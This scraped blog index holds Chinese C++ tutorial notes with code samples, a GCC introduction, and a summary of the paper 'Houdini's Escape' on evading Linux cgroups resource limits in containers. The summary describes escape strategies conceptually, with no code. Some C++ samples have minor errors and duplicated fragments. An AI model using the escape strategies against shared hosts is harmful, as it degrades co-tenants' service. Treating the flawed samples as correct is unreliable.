身高为：&quot; &lt;&lt; *p1.m_Height &lt;&lt; endl; Person p2(p1); cout &lt;&lt; &quot;p2的年龄为：&quot; &lt;&lt; p2.m_Age &lt;&lt; &quot; 身高为：&quot; &lt;&lt; *p2.m_Height &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行发生错误 浅拷贝会带来堆区的内存重复释放 要自己实现拷贝构造函数，解决浅拷贝带来的问题 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//深拷贝与浅拷贝class Person&#123;public: Person() &#123; cout &lt;&lt; &quot;Person的默认构造函数调用&quot; &lt;&lt; endl; &#125; Person(int age, int height) &#123; m_Age = age; m_Height = new int(height); cout &lt;&lt; &quot;Person的有参构造函数调用&quot; &lt;&lt; endl; &#125; Person(const Person&amp; p) &#123; cout &lt;&lt; &quot;Person的拷贝构造函数调用&quot; &lt;&lt; endl; m_Age = p.m_Age; //编译器默认实现m_Height = p.m_Height; //深拷贝操作 m_Height = new int(*p.m_Height); &#125; ~Person() &#123; //析构代码，将堆区开辟的数据做释放操作 if (m_Height != NULL) &#123; delete m_Height; m_Height = NULL; &#125; cout &lt;&lt; &quot;Person的析构函数调用&quot; &lt;&lt; endl; &#125; int m_Age; int* m_Height;&#125;;void test01()&#123; Person p1(18 , 160); cout &lt;&lt; &quot;p1的年龄为：&quot; &lt;&lt; p1.m_Age &lt;&lt; &quot; 身高为：&quot; &lt;&lt; *p1.m_Height &lt;&lt; endl; Person p2(p1); cout &lt;&lt; &quot;p2的年龄为：&quot; &lt;&lt; p2.m_Age &lt;&lt; &quot; 身高为：&quot; &lt;&lt; *p2.m_Height &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果如下： Person的有参构造函数调用p1的年龄为：18 身高为：160Person的拷贝构造函数调用p2的年龄为：18 身高为：160Person的析构函数调用Person的析构函数调用 初始化列表作用：C++提供了初始化列表语法，用来初始化属性 语法：构造函数（）：属性1（值1），属性2（值2）…{} 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//初始化列表class Person&#123;public: ////传统初始化操作 //Person(int a, int b, int c) //&#123; // m_A = a; // m_B = b; // m_C = c; //&#125; //初始化列表初始化属性 Person(int a, int b, int c) :m_A(a), m_B(a), m_C(c) &#123; &#125; int m_A; int m_B; int m_C;&#125;;void test01()&#123; Person p(10, 20, 30); cout &lt;&lt; &quot;m_A = &quot; &lt;&lt; p.m_A &lt;&lt; endl; cout &lt;&lt; &quot;m_B = &quot; &lt;&lt; p.m_B &lt;&lt; endl; cout &lt;&lt; &quot;m_C = &quot; &lt;&lt; p.m_C &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果为： m_A &#x3D; 10m_B &#x3D; 10m_C &#x3D; 30 类对象作为类成员C++类中的成员可以是另一个类的对象，我们称该成员为对象成员 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//类对象作为类成员//手机类class Phone&#123;public: Phone(string pName) &#123; m_PName = pName; cout &lt;&lt; &quot;Phone的构造函数调用&quot; &lt;&lt; endl; &#125; ~Phone() &#123; cout &lt;&lt; &quot;Person的析构函数调用&quot; &lt;&lt; endl; &#125; string m_PName;&#125;;//人类class Person&#123;public: Person(string name, string pName) :m_Name(name), m_Phone(pName) &#123; cout &lt;&lt; &quot;Person的构造函数调用&quot; &lt;&lt; endl; &#125; ~Person() &#123; cout &lt;&lt; &quot;Person的析构函数调用&quot; &lt;&lt; endl; &#125; //姓名 string m_Name; //手机 Phone m_Phone;&#125;;//当其他类对象作为本类成员，构造事先构造类对象，再构造自身,析构顺序与构造相反void test01()&#123; Person p(&quot;张三&quot;, &quot;iphone&quot;); cout &lt;&lt; p.m_Name &lt;&lt; &quot;的手机是&quot; &lt;&lt; p.m_Phone.m_PName &lt;&lt; endl;&#125;int main()&#123; test01();&#125;endl;&#125;int main()&#123; test01();&#125; 运行结果为： Phone的构造函数调用Person的构造函数调用张三的手机是iphonePerson的析构函数调用Person的析构函数调用 静态成员静态成员就是在成员变量和成员函数前加上关键字static，称为静态成员 静态成员分为： 静态成员变量 所有对象共享同一份数据 在编译阶段分配内存 类内声明，类外初始化 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Person&#123;public: //1、所有对象都共享同一份数据 //2、编译阶段就分配内存 //3、类内声明，类外初始化操作 //4、私有静态成员变量在类外访问不了 static int m_A;private: static int m_B;&#125;;int Person::m_A = 100;int Person::m_B = 100;void test01()&#123; Person p; cout &lt;&lt; p.m_A &lt;&lt; endl; Person p1; p1.m_A = 200; cout &lt;&lt; p1.m_A &lt;&lt; endl;&#125;void test02()&#123; //静态成员变量 不属于某个对象上，所有对象都共享同一份数据 //因此静态成员变量有两种访问方式 //1、通过对象进行访问 Person p; cout &lt;&lt; p.m_A &lt;&lt; endl; //2、通过类名进行访问 cout &lt;&lt; Person::m_A &lt;&lt; endl;&#125;int main()&#123; test01(); test02();&#125; 运行结果如下 100200200200 静态成员函数 所有对象共享同一个函数 静态成员函数只能访问静态成员变量 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//静态成员函数//所有对象共享同一个函数//静态成员函数只能访问静态成员变量class Person&#123;public: //静态成员函数 static void func() &#123; m_A = 100; cout &lt;&lt; &quot;static void func调用&quot; &lt;&lt; endl; &#125; static int m_A;//静态成员变量 int m_B;//非静态成员变量private: static void func2()//类外访问不到私有静态成员函数 &#123; &#125;&#125;;int Person::m_A = 100;//有两种访问方式void test01()&#123; //1、通过对象访问 Person p; p.func(); //2、通过类名访问 Person::func();&#125;int main()&#123; test01();&#125; 运行结果为： static void func调用static void func调用 C++对象模型和this指针成员变量和成员函数分开存储在C++中，类内的成员变量和成员函数分开存储 只有非静态成员变量才属于类的对象上 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//成员变量 和 成员函数 分开存储的class Person&#123;&#125;;void test01()&#123; Person p; //空对象占用内存空间为： 1 //C++编译器会给每个空对象也分配一个字节空间，是为了区分空对象占内存的位置 //每个空对象也应该有一个独一无二的内存地址 cout &lt;&lt; &quot;size of p = &quot; &lt;&lt; sizeof(p) &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果为： size of p &#x3D; 1 12345678910111213141516171819#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//成员变量 和 成员函数 分开存储的class Person&#123; int m_A;//非静态成员变量&#125;;void test01()&#123; Person p; cout &lt;&lt; &quot;size of p = &quot; &lt;&lt; sizeof(p) &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果为： size of p &#x3D; 4 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//成员变量 和 成员函数 分开存储的class Person&#123; int m_A;//非静态成员变量 属于类的对象上 static int m_B;//静态成员变量&#125;;int Person::m_B = 100;void test01()&#123; Person p; cout &lt;&lt; &quot;size of p = &quot; &lt;&lt; sizeof(p) &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果为： size of p &#x3D; 4 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//成员变量 和 成员函数 分开存储的class Person&#123; int m_A;//非静态成员变量 属于类的对象上 static int m_B;//静态成员变量 不属于类的对象上 void func()&#123;&#125;//非静态成员函数 不属于类的对象上&#125;;int Person::m_B = 100;void test01()&#123; Person p; cout &lt;&lt; &quot;size of p = &quot; &lt;&lt; sizeof(p) &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果为： size of p &#x3D; 4 this指针概念通过上述代码我们知道在C++中成员变量喝成员函数是分开存储的 每一个非静态成员函数只会诞生一份函数实例，也就是说多个同类型的对象会共用一块代码 那么问题是：这一块代码是如何区分那个对象调用自己的呢? C++通过提供特殊的对象指针，this指针，解决上述问题。this指针指向被调用的成员函数所属的对象 this指针是隐含每一个非静态成员函数内的一种指针 this指针不需要定义，直接使用即可 this指针的用途： 当形参和成员变量同名时，可用this指针来区分 在类的非静态成员函数中返回对象本身，可使用return *this 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Person &#123;public: Person(int age) &#123; age = age; &#125; int age;&#125;;//1 解决名称冲突void test01()&#123; Person p1(18); cout &lt;&lt; &quot;p1的年龄为&quot; &lt;&lt; p1.age &lt;&lt; endl;&#125;//2 返回对象本身用*thisint main()&#123; test01();&#125; 运行结果为： p1的年龄为-858993460 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Person &#123;public: Person(int age) &#123; this-&gt;age = age; &#125; int age;&#125;;//1 解决名称冲突void test01()&#123; Person p1(18); cout &lt;&lt; &quot;p1的年龄为&quot; &lt;&lt; p1.age &lt;&lt; endl;&#125; //2 返回对象本身用*thisint main()&#123; test01();&#125; 运行结果为： p1的年龄为18 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Person &#123;public: Person(int age) &#123; this-&gt;age = age; &#125; Person&amp; PersonAddAge(Person&amp; p) &#123; this-&gt;age += p.age; return *this; &#125; int age;&#125;;//1 解决名称冲突void test01()&#123; Person p1(18); cout &lt;&lt; &quot;p1的年龄为&quot; &lt;&lt; p1.age &lt;&lt; endl;&#125; //2 返回对象本身用*thisvoid test02()&#123; Person p1(10); Person p2(20); //链式编程 p2.PersonAddAge(p1).PersonAddAge(p1).PersonAddAge(p1); cout &lt;&lt; &quot;p2的年龄为： &quot; &lt;&lt; p2.age &lt;&lt; endl;&#125;int main()&#123; test01(); test02();&#125; 运行结果为： p1的年龄为18p2的年龄为： 50 空指针访问成员函数C++中空指针也是可以调用成员函数的，但是也要注意有没有用到this指针 如果用到this指针，需要加以判断保证代码的健壮性 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//空指针调用成员函数class Person&#123;public: void showClassName() &#123; cout &lt;&lt; &quot;this is Person class&quot; &lt;&lt; endl; &#125; void showPersonAge() &#123; cout &lt;&lt; &quot;age = &quot; &lt;&lt; m_Age &lt;&lt; endl; &#125; int m_Age;&#125;;void test01()&#123; Person* p = NULL; //p-&gt;showClassName(); p-&gt;showPersonAge();&#125; 这段代码会运行错误，报错原因是因为传入的指针是NULL 而下述代码不会报错 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//空指针调用成员函数class Person&#123;public: void showClassName() &#123; cout &lt;&lt; &quot;this is Person class&quot; &lt;&lt; endl; &#125; void showPersonAge() &#123; cout &lt;&lt; &quot;age = &quot; &lt;&lt; m_Age &lt;&lt; endl; &#125; int m_Age;&#125;;void test01()&#123; Person* p = NULL; p-&gt;showClassName(); //p-&gt;showPersonAge();&#125;int main()&#123; test01();&#125; 我们将代码修改为： 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//空指针调用成员函数class Person&#123;public: void showClassName() &#123; cout &lt;&lt; &quot;this is Person class&quot; &lt;&lt; endl; &#125; void showPersonAge() &#123; if (this == NULL) return; cout &lt;&lt; &quot;age = &quot; &lt;&lt; m_Age &lt;&lt; endl; &#125; int m_Age;&#125;;void test01()&#123; Person* p = NULL; p-&gt;showClassName(); p-&gt;showPersonAge();&#125;int main()&#123; test01();&#125; 代码也不会报错 const修饰成员函数 常函数： 成员函数后加const后我们称这个函数为常函数 常函数内不可以修改成员属性 成员属性声明时加关键字mutable后，在常函数中依然可以修改 常对象： 声明对象前加const称该对象为常对象 常对象只能调用常函数","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"C++ 学习 Linux系统编程 GCC","slug":"C++-学习-Linux系统编程-GCC","date":"2023-04-16T07:56:51.000Z","updated":"2023-12-15T06:56:15.865Z","comments":true,"path":"2023/04/16/C++-学习-Linux系统编程-GCC/","link":"","permalink":"http://example.com/2023/04/16/C++-%E5%AD%A6%E4%B9%A0-Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-GCC/","excerpt":"什么是GCC GCC 原名为 GNU C语言编译器（GNU C Compiler） GCC（GNU Compiler Collection，GNU编译器套件）是由 GNU 开发的编程语言译器。GNU 编译器套件包括 C、C++、Objective-C、Java、Ada 和 Go 语言前端，也包括了这些语言的库（如 libstdc++，libgcj等） GCC 不仅支持 C 的许多“方言”，也可以区别不同的 C 语言标准；可以使用命令行选项来控制编译器在翻译源代码时应该遵循哪个 C 标准。例如，当使用命令行参数-std=c99 启动 GCC 时，编译器支持 C99 标准。 安装命令 sudo apt install gcc g++ （版本 &gt; 4.8.5） 查看版本 gcc/g++ -v/--version GCC工作流程","text":"什么是GCC GCC 原名为 GNU C语言编译器（GNU C Compiler） GCC（GNU Compiler Collection，GNU编译器套件）是由 GNU 开发的编程语言译器。GNU 编译器套件包括 C、C++、Objective-C、Java、Ada 和 Go 语言前端，也包括了这些语言的库（如 libstdc++，libgcj等） GCC 不仅支持 C 的许多“方言”，也可以区别不同的 C 语言标准；可以使用命令行选项来控制编译器在翻译源代码时应该遵循哪个 C 标准。例如，当使用命令行参数-std=c99 启动 GCC 时，编译器支持 C99 标准。 安装命令 sudo apt install gcc g++ （版本 &gt; 4.8.5） 查看版本 gcc/g++ -v/--version GCC工作流程 GCC和G++的区别 gcc 和 g++都是GNU(组织)的一个编译器。 误区一：gcc 只能编译 c 代码，g++ 只能编译 c++ 代码。两者都可以，请注意： 后缀为 .c 的，gcc 把它当作是 C 程序，而 g++ 当作是 c++ 程序 后缀为 .cpp 的，两者都会认为是 C++ 程序，C++ 的语法规则更加严谨一些 编译阶段，g++ 会调用 gcc，对于 C++ 代码，两者是等价的，但是因为 gcc命令不能自动和 C++ 程序使用的库联接，所以通常用 g++ 来完成链接，为了统一起见，干脆编译&#x2F;链接统统用 g++ 了，这就给人一种错觉，好像 cpp 程序只能用 g++ 似的 误区二：gcc 不会定义 __cplusplus 宏，而 g++ 会 实际上，这个宏只是标志着编译器将会把代码按 C 还是 C++ 语法来解释 如上所述，如果后缀为 .c，并且采用 gcc 编译器，则该宏就是未定义的，否则，就是已定义 误区三：编译只能用 gcc，链接只能用 g++ 严格来说，这句话不算错误，但是它混淆了概念，应该这样说：编译可以gcc&#x2F;g++，而链接可以用 g++ 或者 gcc -lstdc++。 gcc 命令不能自动和C++程序使用的库联接，所以通常使用 g++ 来完成联接。但在编译阶段，g++ 会自动调用 gcc，二者等价","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"Linux系统编程","slug":"编程语言/C/Linux系统编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"论文阅读 Houdini’s Escape: Breaking the Resource Rein of Linux Control Groups","slug":"论文阅读-Houdini’s-Escape-Breaking-the-Resource-Rein-of-Linux-Control-Groups","date":"2023-04-15T05:08:53.000Z","updated":"2023-04-22T11:50:35.932Z","comments":true,"path":"2023/04/15/论文阅读-Houdini’s-Escape-Breaking-the-Resource-Rein-of-Linux-Control-Groups/","link":"","permalink":"http://example.com/2023/04/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-Houdini%E2%80%99s-Escape-Breaking-the-Resource-Rein-of-Linux-Control-Groups/","excerpt":"摘要 Linux Control Groups，即cgroups，是启用操作系统级容器化的关键构建块。cgroups机制将进程划分为分层的组，并应用不同的控制器来管理系统资源，包括CPU、内存、块I&#x2F;O等。新生成的子进程自动从父进程中复制cgroups属性以加强资源控制。不幸的是，通过进程创建继承的cgroups限制并不总是保证一致和公平的资源核算。在本文中，我们设计了一套利用策略，通过将进程与原始进程组解关联来生成out-of-band工作负载。这样的工作负载所消耗的系统资源不会被计算到适当的cgroup中。 为了进一步证明可行性，我们提供了Docker容器中的五个案例研究，以演示如何在现实场景中打破cgroup的资源限制。更糟糕的是，通过利用这些cgroups在多租户容器环境中的不足，攻击容器能够极大地扩大所消耗的资源数量，显著降低同一主机上的其他容器的速度，并在系统资源上获得额外的不公平优势。我们在本地测试平台和Amazon EC2云专用服务器上进行了大量的实验。实验结果表明，一个容器可以消耗系统资源(例如CPU)高达其极限的200倍，并使其他共存容器中特定工作负载的计算和I&#x2F;O性能降低95%。","text":"摘要 Linux Control Groups，即cgroups，是启用操作系统级容器化的关键构建块。cgroups机制将进程划分为分层的组，并应用不同的控制器来管理系统资源，包括CPU、内存、块I&#x2F;O等。新生成的子进程自动从父进程中复制cgroups属性以加强资源控制。不幸的是，通过进程创建继承的cgroups限制并不总是保证一致和公平的资源核算。在本文中，我们设计了一套利用策略，通过将进程与原始进程组解关联来生成out-of-band工作负载。这样的工作负载所消耗的系统资源不会被计算到适当的cgroup中。 为了进一步证明可行性，我们提供了Docker容器中的五个案例研究，以演示如何在现实场景中打破cgroup的资源限制。更糟糕的是，通过利用这些cgroups在多租户容器环境中的不足，攻击容器能够极大地扩大所消耗的资源数量，显著降低同一主机上的其他容器的速度，并在系统资源上获得额外的不公平优势。我们在本地测试平台和Amazon EC2云专用服务器上进行了大量的实验。实验结果表明，一个容器可以消耗系统资源(例如CPU)高达其极限的200倍，并使其他共存容器中特定工作负载的计算和I&#x2F;O性能降低95%。 CCS CONCEPT Security and privacy → Virtualization and security KEYWORDS Container；Control Group；Docker INTRODUCTION容器技术已广泛应用于各种计算场景，包括边缘计算、微服务架构、无服务器计算和商业云供应商。与虚拟机相比，消除额外的抽象层可以更好地利用资源并提高效率。因此，容器可以实现接近本机的性能。 尽管容器技术具有性能优势，但最近也引起了一些安全和隐私问题，特别是资源隔离、特权升级、混淆代理攻击和隐蔽通道。 在Linux内核中，启用容器资源隔离和管理的两个关键构建块是Linux命名空间(即namespaces)和Linux控制组(即cgroups)。此外，还采用或建议了一组安全机制(例如，Capabilities、SELinux、AppArmor、seccomp和安全命名空间)来进一步增强部署中的容器安全性。 容器依赖于cgroup进行资源管理和控制，以防止一个容器耗尽主机的系统资源。cgroups机制将一组进程及其子进程划分为分层的组，并应用不同的控制器来管理和限制各种系统资源，例如CPU时间、计算机内存、块I&#x2F;O等。通过合理的限制策略，cgroups可以缓解许多已知的拒绝服务漏洞。 容器技术已广泛应用于各种计算场景，包括边缘计算、微服务架构、无服务器计算和商业云供应商。与虚拟机相比，消除额外的抽象层可以更好地利用资源并提高效率。因此，容器可以实现接近本机的性能。 尽管容器技术具有性能优势，但最近也引起了一些安全和隐私问题，特别是资源隔离、特权升级、混淆代理攻击和隐蔽通道。 在Linux内核中，启用容器资源隔离和管理的两个关键构建块是Linux命名空间(即命名空间)和Linux控制组(即cgroups1)。此外，还采用或建议了一组安全机制(例如，Capabilities、SELinux、AppArmor、seccomp和安全命名空间)来进一步增强部署中的容器安全性。 容器依赖于cgroup进行资源管理和控制，以防止一个容器耗尽主机的系统资源。cgroups机制将一组进程及其子进程划分为分层的组，并应用不同的控制器来管理和限制各种系统资源，例如CPU时间、计算机内存、块I&#x2F;O等。通过合理的限制策略，cgroups可以缓解许多已知的拒绝服务漏洞 在本文中，我们打算系统地探讨一下来摆脱现有的cgroups机制的资源控制、并了解其对容器的安全影响。新创建的子进程会自动继承其父进程的cgroups属性。这种机制保证了它们将被限制在相同的cgroups策略下。为了打破cgroups的资源约束，我们设计了一套利用策略，通过将进程与其原始cgroups分离，生成了一些带外工作负载。这意味着这些进程不再受到原始cgroups的资源限制，从而可能绕过原本的资源管理策略。这些进程可以从头开始创建，以处理在一个cgroup内发起的系统事件。在其他情况下，这些进程可以是休眠的内核线程或系统服务进程。在整个系统中共享，并将在需要时被激活。因此，相应的消耗的资源将被收取到其他 “受害者 “cgroups中。 为了进一步揭示现有cgroup机制不足的安全风险，我们使用Docker容器进行了五个案例研究，展示了在现实系统设置中逃脱cgroup资源控制的步骤。在这些案例研究中，我们分别利用了异常、文件系统和I&#x2F;O设备、Linux日志系统、容器引擎和softirqs处理的内核处理机制。我们在亚马逊EC2云中的本地测试平台和专用服务器上进行实验。我们的实验表明，即使执行了多个cgroup控制器，一个对抗性去特权容器仍然可以显著耗尽CPU资源或产生大量的I&#x2F;O活动，而不需要任何cgroup控制器。 更糟糕的是，通过在多租户容器环境中利用这些机制，对抗性容器能够极大地扩大所消耗的资源量。由于对抗容器会发动多种攻击(如拒绝服务攻击和资源释放攻击)，可以显著降低同一主机上的其他容器的速度，并在系统资源上获得额外的不公平优势。我们的实验证明，对手仅通过控制少量资源就能显著影响共存容器的性能。例如，一个容器可能会消耗系统资源(例如CPU)，超过其极限200倍，并使其他容器的特定基准的计算和I&#x2F;O性能降低95%。总体而言，本工作的主要贡献总结如下: 我们提出了四种可能导致系统资源错误计算的开发策略，因此我们可以逃避cgroup控制器强制执行的资源约束。 我们在Docker容器环境中进行了五个案例研究，并证明了在现实场景中打破cgroup限制并消耗大量资源是可能的。 我们在两个具有不同配置的试验台上评估了所提出的方法的影响。实验结果表明了安全影响的严重性。 本文的其余部分组织如下。第二节介绍了cgroup的背景。第3节介绍了逃脱cgroups机制控制的策略，并从内核的角度分析了其根本原因。第4节详细介绍了容器的几个案例研究，包括威胁模型、攻击向量以及对多租户容器环境的各种攻击的有效性。第5节从不同方面讨论了潜在的缓解措施。第6节对相关工作进行考察，并在第7节中进行总结。 BACKGROUND在Linux内核中，cgroups是用于管理一组任务及其所有子任务的系统资源(例如CPU、内存、磁盘I&#x2F;O、网络等)的关键特性。它是实现集装箱化的构建块之一。cgroup机制将进程组划分为具有控制行为的分层组。所有的子进程也从它们的父进程继承某些属性(例如，limits)，并由该机制控制。cgroups依赖于不同的资源控制器(或子系统)来限制、解释和隔离各种类型的系统资源，包括CPU时间、系统内存、块I&#x2F;O、网络带宽等。Linux容器利用控制组对每个容器实例应用资源限制，并防止单个容器耗尽主机资源。对于云计算中的计费模型，还可以使用cgroups为每个容器分配相应的资源并测量它们的使用情况。下面我们简要介绍cgroup层次结构的背景知识，现有容器环境中通常应用的四种典型的cgroup控制器，以及新生成进程的cgroup继承过程。 cgroups Hierarchy and Controllers在Linux中，cgroup是按层次结构组织的，其中一组cgroup被排列在树中。每个任务(例如，一个线程)只能与一个层次结构中的一个cgroup相关联，但可以是不同层次结构中的多个cgroup的成员。然后，每个层次结构都有一个或多个附加子系统，以便资源控制器可以对特定的系统资源应用每个cgroup限制。通过分层结构，cgroups机制能够限制一组进程(例如容器)的资源总量。 The cpu controllercpu controller通过利用CFS(完全公平的调度器，在Linux 2.6.23中引入)调度cpu，以两种方式使cpu成为可管理的资源。 第一种方法是保证最少数量的CPU共享:每个组都提供相应的共享，以定义相对权重。该策略在CPU空闲时不限制cgroup的CPU使用率，当多个cgroup竞争相同的CPU资源时，按照权重的比例分配带宽。例如，如果共享为512的一个容器与共享为1024的另一个容器运行在同一个核心上。然后，第一个容器的CPU使用率大致为33.3%，而另一个容器的CPU使用率为66.7%。在Linux 3.2中进一步扩展了cpu控制器，通过指定配额和周期来提供额外的cpu带宽控制。 每个组只能在每个给定的“时间段”(以微秒为单位)内消耗“配额”微秒。如果一个组的CPU带宽消耗(由运行时变量跟踪)超过了限制，控制器将限制该任务，直到下一个时间段，此时容器的运行时被重新充电到其配额。cpu控制器被广泛应用于多租户容器环境，以限制一个容器的cpu使用。如果容器设置的配额为50,000，周期为100,000，则该容器最多可以消耗一个CPU核心总CPU周期的一半。 The cpusets controllercpusets控制器提供了一种机制，用于将一组任务约束到特定的cpu和内存节点。在多租户容器环境中，利用cpusets控制器来限制特定核心上容器的工作负载。容器的每个任务都附加到一个cpuset，其中包含一组允许使用的cpu和内存节点。对于CPU调度，任务的调度(通过系统调用sched_setaffinity)被过滤到任务的cpusset允许的那些CPU。任务的任何进一步的动态迁移也仅限于允许的cpuset。因此，cpusets控制器还可以用于将一个进程固定在特定的核心上。容器用户还可以利用用户空间应用程序(例如，taskset)在cpuset的限制范围内进一步设置亲和性。 The blkio controllerblkio cgroup通过应用I&#x2F;O控制来控制和限制对指定块设备的访问。内核级有两个策略可用。第一个是基于比例权重的基于时间的磁盘策略划分。每个cgroup都被分配了一个blkio。权重值，表示该组占用磁盘时间的比例。第二个是节流策略，它指定I&#x2F;O设备上的上限。 The pid controllerpid cgroup子系统用于对容器的任务数量设置一定的限制。这可以通过在pid.max中设置最大任务数来实现。当前任务数保存在pid .current中。pid cgroup子系统将在达到限制(例如，pid.current&gt; pid .max)停止forking或克隆一个新任务(例如，返回错误信息)。因此，pid控制器可以有效防御多种耗尽攻击，如fork bomb。 cgroups Inheritancecgroups的一个重要特性是子进程从父进程继承cgroups属性。每当一个进程创建一个子进程(例如，fork或clone)时，它都会触发内核中的fork函数来复制初始化进程。当新派生的进程在开始时附加到根cgroup时，在复制寄存器和进程环境的其他适当部分(例如，命名空间)后，调用cgroup复制函数来复制父进程的cgroup。特别是，该函数通过递归遍历所有cgroup子系统，将任务附加到其父cgroup。因此，在复制过程之后，子任务将继承与其父任务完全相同的cgroups成员。 例如，如果cpusets资源控制器将父进程的the CPU affinity设置为第二个核心，那么新派生的子进程也将被固定在第二个核心上。同时，如果cpu子系统将父cgroup上的cpu配额限制为50,000，周期为100,000，那么在第二个核上，cgroup的总cpu利用率(包括新分叉的进程和它的父进程)不能超过50%。 EXPLOITING STRATEGIES在本节中，我们将描述四种逃避cgroups机制的资源控制的策略，并解释现有cgroup无法跟踪所消耗资源的根本原因。如上所述，使用层次结构，cgroups机制可以限制一组进程(例如容器)的资源总量。这是通过附加资源控制器对特定的系统资源应用每cgroup限制来实现的。此外，cgroup中的继承机制确保了同一个cgroup中的所有进程及其子进程都可以被cgroup子系统控制，而不消耗额外的系统资源。 然而，由于Linux内核的复杂性和实现cgroups的难度，我们发现有几个机制没有考虑到，因此可以利用它们来逃避现有cgroups的约束。关键思想是生成工作负载，运行在没有直接从初始化cgroup派生出来的进程上，这导致了cgroup的去关联。特别是，如图所示，用户空间中没有根权限的普通进程可以利用四种策略逃脱cgroups的控制。 Exploiting Upcalls from Kernel在cgroups机制中，所有内核线程都附加到根cgroup，因为内核线程是由内核创建的。因此，内核线程通过fork或clone创建的所有进程也都附加到与其父进程相同的cgroup(根cgroup)中。 因此，一个cgroup中的进程可以利用内核线程作为代理来产生新的进程，从而逃脱cgroup的控制。特别地，如图❶所示，一个进程可以先触发内核来初始化一个内核线程。 这个内核线程充当代理，进一步创建一个新进程。 由于内核线程附加到根cgroup，因此新创建的进程也附加到根cgroup。在新创建的进程上运行的所有工作负载将不受cgroup子系统的限制，从而打破资源控制。 但是，这种机制要求用户空间进程首先调用内核空间中的内核函数，然后从内核空间向上调用用户空间进程。虽然从用户空间调用特定的内核函数(例如系统调用)是很自然的，但相反的方向并不常见。一种可行的方法是通过usermode helper API，该API通过提供可执行变量和环境变量的名称，为在用户空间中创建流程提供了一个简单的接口。这个函数首先调用一个运行在内核线程中的工作队列(例如，kworker)。工作队列的处理函数进一步创建一个内核线程来启动用户进程。最后一步调用内核中的fork函数，将创建的用户进程附加到内核线程的cgroups。 用户模式助手API可用于多种场景，如加载模块、重新启动计算机、生成安全密钥和传递内核事件。虽然在用户空间中触发这些活动通常需要root权限，但仍然可以在用户空间中调用API，这将在4.1节中讨论。 Delegating Workloads to Kernel Threads另一种利用内核线程来打破cgroup约束的方法是将工作负载委托给它们，如图❷所示。同样，由于所有内核线程都附加到根cgroup，因此这些工作负载所消耗的资源量将计入目标内核线程，而不是初始化用户空间进程。 Linux内核运行多个内核线程，处理各种内核函数并在进程上下文中运行内核代码。例如，kthread是内核线程守护进程，用于创建其他内核线程;引入Kworker来处理工作队列任务;Ksoftirqd服务于softirqs;迁移执行迁移作业，将任务从一个核心移动到另一个核心;kswapd管理交换空间。对于这些内核线程，根据它们的功能，内核可能只在系统中运行一个线程(例如kthread)，或者每个内核运行一个线程(例如ksoftirqd)，或者每个内核运行多个线程(例如kworker)。一直有报道称，由于各种bug和问题，内核线程会消耗大量的资源。因此，如果一个进程可以强制内核线程运行委托的工作负载，相应消耗的资源将不受cgroup的限制。 Exploiting Service Processes除了由内核维护的内核线程外，Linux服务器还运行多个系统进程(例如systemd)，用于不同的目的，如进程管理、系统信息日志记录、调试等。这些流程监视其他流程，并在触发特定活动时生成工作负载。同时，许多用户空间进程作为其他进程的依赖关系，同时运行以支持其他进程的正常功能。如果一个用户进程能够在这些进程上生成内核工作负载(图中的策略❸ )，所消耗的资源就不会被分配给初始化进程，从而可以逃脱cgroups机制。 Exploiting Interrupt Context最后一种策略是利用中断上下文中所消耗的资源。cgroup机制只计算在进程上下文中消耗的资源。一旦内核运行在其他上下文(如中断上下文,如图所示的策略❹),所有消耗的资源都不会被计入任何cgroup 